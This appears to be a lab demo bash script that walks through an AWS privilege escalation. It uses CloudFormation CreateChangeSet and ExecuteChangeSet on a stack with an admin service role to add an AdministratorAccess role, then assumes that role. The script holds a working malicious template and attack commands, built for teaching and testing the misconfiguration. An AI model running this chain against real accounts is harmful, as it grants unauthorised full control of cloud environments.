#!/bin/bash

# Demo script for cloudformation:CreateChangeSet and ExecuteChangeSet privilege escalation
# This scenario demonstrates how a user with cloudformation:CreateChangeSet and
# ExecuteChangeSet permissions can modify an existing stack that uses an administrative
# service role to create a new escalated role, which they can then assume for full admin access.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-cloudformation-005-to-admin-starting-user"
STACK_NAME="pl-prod-cloudformation-005-to-admin-target-stack"
CHANGESET_NAME="pl-prod-cloudformation-005-escalation-changeset"
ESCALATED_ROLE_NAME="pl-prod-cloudformation-005-to-admin-escalated-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CloudFormation CreateChangeSet+ExecuteChangeSet Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Disable OTEL to prevent terraform output issues
export OTEL_TRACES_EXPORTER=""

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_cloudformation_005_cloudformation_createchangeset_executechangeset.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region and resource suffix (needed later)
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

if [ -z "$RESOURCE_SUFFIX" ]; then
    echo -e "${RED}Error: Could not retrieve resource_suffix from Terraform${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Resource Suffix: $RESOURCE_SUFFIX"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover the existing CloudFormation stack
echo -e "${YELLOW}Step 5: Discovering the existing CloudFormation stack${NC}"
use_readonly_creds
echo "Stack name: $STACK_NAME"
echo ""
echo "Stack details:"
show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].[StackName,StackStatus,Description]' --output table"
aws cloudformation describe-stacks \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --query 'Stacks[0].[StackName,StackStatus,Description]' \
    --output table

echo ""
echo "Stack service role (has admin permissions):"
show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].RoleARN' --output text"
aws cloudformation describe-stacks \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --query 'Stacks[0].RoleARN' \
    --output text

echo ""
echo "Current stack template (benign - just creates an S3 bucket):"
show_cmd "ReadOnly" "aws cloudformation get-template --region $AWS_REGION --stack-name $STACK_NAME --query 'TemplateBody' --output text"
aws cloudformation get-template \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --query 'TemplateBody' \
    --output text | head -n 20

echo -e "${GREEN}✓ Stack has admin service role and benign resources${NC}\n"

# Step 6: Create malicious CloudFormation template
echo -e "${YELLOW}Step 6: Creating malicious CloudFormation template${NC}"
echo "Creating template that adds an admin role we can assume..."

MALICIOUS_TEMPLATE=$(cat <<EOF
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Description": "Updated template via ChangeSet - adds escalated admin role",
  "Resources": {
    "InitialBucket": {
      "Type": "AWS::S3::Bucket",
      "Properties": {
        "BucketName": "pl-prod-cloudformation-005-to-admin-initial-bucket-${ACCOUNT_ID}-${RESOURCE_SUFFIX}",
        "Tags": [
          {
            "Key": "Name",
            "Value": "pl-prod-cloudformation-005-to-admin-initial-bucket"
          },
          {
            "Key": "Environment",
            "Value": "prod"
          },
          {
            "Key": "Scenario",
            "Value": "cloudformation-createchangeset-executechangeset"
          },
          {
            "Key": "Purpose",
            "Value": "initial-benign-resource"
          }
        ]
      }
    },
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "${ESCALATED_ROLE_NAME}",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "AWS": "arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
              },
              "Action": "sts:AssumeRole"
            }
          ]
        },
        "ManagedPolicyArns": [
          "arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "Tags": [
          {
            "Key": "Name",
            "Value": "${ESCALATED_ROLE_NAME}"
          },
          {
            "Key": "Environment",
            "Value": "prod"
          },
          {
            "Key": "Scenario",
            "Value": "cloudformation-createchangeset-executechangeset"
          },
          {
            "Key": "Purpose",
            "Value": "escalated-admin-role"
          }
        ]
      }
    }
  },
  "Outputs": {
    "BucketName": {
      "Description": "Name of the initial S3 bucket",
      "Value": {
        "Ref": "InitialBucket"
      }
    },
    "EscalatedRoleArn": {
      "Description": "ARN of the escalated admin role",
      "Value": {
        "Fn::GetAtt": [
          "EscalatedAdminRole",
          "Arn"
        ]
      }
    }
  }
}
EOF
)

# Save the template to a temporary file
echo "$MALICIOUS_TEMPLATE" > /tmp/malicious-changeset-template.json
echo "Malicious template saved to: /tmp/malicious-changeset-template.json"
echo ""
echo "Template adds:"
echo "  - EscalatedAdminRole: IAM role with AdministratorAccess"
echo "  - Trust policy allows: $STARTING_USER to assume the role"
echo -e "${GREEN}✓ Malicious template created${NC}\n"

# [EXPLOIT] Step 7: Create a ChangeSet for the stack
echo -e "${YELLOW}Step 7: Creating ChangeSet for the CloudFormation stack${NC}"
use_starting_creds
echo "Using cloudformation:CreateChangeSet permission..."
echo "ChangeSet name: $CHANGESET_NAME"
echo ""

show_attack_cmd "Attacker" "aws cloudformation create-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --template-body file:///tmp/malicious-changeset-template.json --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE --description \"Escalation via CreateChangeSet - adds admin role\""
aws cloudformation create-change-set \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --change-set-name $CHANGESET_NAME \
    --template-body file:///tmp/malicious-changeset-template.json \
    --capabilities CAPABILITY_NAMED_IAM \
    --change-set-type UPDATE \
    --description "Escalation via CreateChangeSet - adds admin role"

echo -e "${GREEN}✓ ChangeSet creation initiated${NC}\n"

# Wait for ChangeSet to be ready
echo -e "${YELLOW}Waiting 15 seconds for ChangeSet to be created...${NC}"
sleep 15
echo -e "${GREEN}✓ ChangeSet should be ready${NC}\n"

# [OBSERVATION] Step 8: View the ChangeSet details
echo -e "${YELLOW}Step 8: Viewing ChangeSet details${NC}"
use_readonly_creds
echo "ChangeSet: $CHANGESET_NAME"
echo ""

show_cmd "ReadOnly" "aws cloudformation describe-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --query '[ChangeSetName,Status,Changes[?ResourceChange.Action==\`Add\`].ResourceChange.LogicalResourceId]' --output table"
aws cloudformation describe-change-set \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --change-set-name $CHANGESET_NAME \
    --query '[ChangeSetName,Status,Changes[?ResourceChange.Action==`Add`].ResourceChange.LogicalResourceId]' \
    --output table

echo -e "${GREEN}✓ ChangeSet will add the escalated role${NC}\n"

# [EXPLOIT] Step 9: Execute the ChangeSet
echo -e "${YELLOW}Step 9: Executing the ChangeSet${NC}"
use_starting_creds
echo "Using cloudformation:ExecuteChangeSet permission..."
echo "The stack's admin service role will create the escalated role"
echo ""

show_attack_cmd "Attacker" "aws cloudformation execute-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME"
aws cloudformation execute-change-set \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --change-set-name $CHANGESET_NAME

echo -e "${GREEN}✓ ChangeSet execution initiated${NC}\n"

# Wait for stack update to complete (using readonly creds - polls DescribeStacks)
echo -e "${YELLOW}Waiting for stack update to complete...${NC}"
use_readonly_creds
aws --region $AWS_REGION cloudformation wait stack-update-complete --stack-name $STACK_NAME
echo -e "${GREEN}✓ Stack update completed${NC}\n"

# Additional wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM role to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM role propagated${NC}\n"

# [OBSERVATION] Step 10: Verify the escalated role was created
echo -e "${YELLOW}Step 10: Verifying escalated role was created${NC}"
use_readonly_creds
ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$ESCALATED_ROLE_NAME"
echo "Role ARN: $ROLE_ARN"

show_cmd "ReadOnly" "aws iam get-role --role-name $ESCALATED_ROLE_NAME"
if aws iam get-role --role-name $ESCALATED_ROLE_NAME &> /dev/null; then
    echo -e "${GREEN}✓ Escalated role exists${NC}"

    # # Show the role's policies
    # echo ""
    # echo "Role attached policies:"
    # aws iam list-attached-role-policies \
    #     --role-name $ESCALATED_ROLE_NAME \
    #     --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    #     --output table
else
    echo -e "${RED}✗ Escalated role not found${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 11: Assume the escalated admin role
echo -e "${YELLOW}Step 11: Assuming the escalated admin role${NC}"
use_starting_creds
echo "Using sts:AssumeRole to get admin credentials..."
echo ""

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalation-demo-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name escalation-demo-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"

if [[ ! $ROLE_IDENTITY == *"$ESCALATED_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Failed to assume escalated role${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed escalated admin role${NC}\n"

# [OBSERVATION] Step 12: Verify administrator access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users (using assumed escalated role credentials)..."

show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Discovered existing CloudFormation stack with admin service role"
echo "3. Created malicious template with admin role"
echo "4. Used cloudformation:CreateChangeSet to prepare stack modification"
echo "5. Viewed ChangeSet details to confirm changes"
echo "6. Used cloudformation:ExecuteChangeSet to apply the changes"
echo "7. Stack's admin service role created the escalated role"
echo "8. Assumed the newly created escalated admin role"
echo "9. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (cloudformation:CreateChangeSet + ExecuteChangeSet)"
echo "  → Stack (admin service role) → Creates $ESCALATED_ROLE_NAME"
echo "  → (sts:AssumeRole) → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Escalated admin role: $ESCALATED_ROLE_NAME"
echo "- Modified CloudFormation stack: $STACK_NAME"
echo "- Executed ChangeSet: $CHANGESET_NAME"
echo "- Template file: /tmp/malicious-changeset-template.json"

echo -e "\n${YELLOW}Key Vulnerability:${NC}"
echo "The CloudFormation stack has an administrative service role, and the user"
echo "can create and execute ChangeSets on the stack. This allows creating any"
echo "resource the service role has permissions for, including IAM roles with"
echo "trust policies that grant access back to the attacker."

echo -e "\n${YELLOW}Difference from UpdateStack:${NC}"
echo "Unlike UpdateStack which requires the full permission, CreateChangeSet and"
echo "ExecuteChangeSet allow more granular control. Many organizations grant these"
echo "permissions separately, thinking it provides better oversight. However, both"
echo "permissions together allow the same privilege escalation as UpdateStack."

echo -e "\n${RED}⚠ Warning: The escalated role and modified stack remain active${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
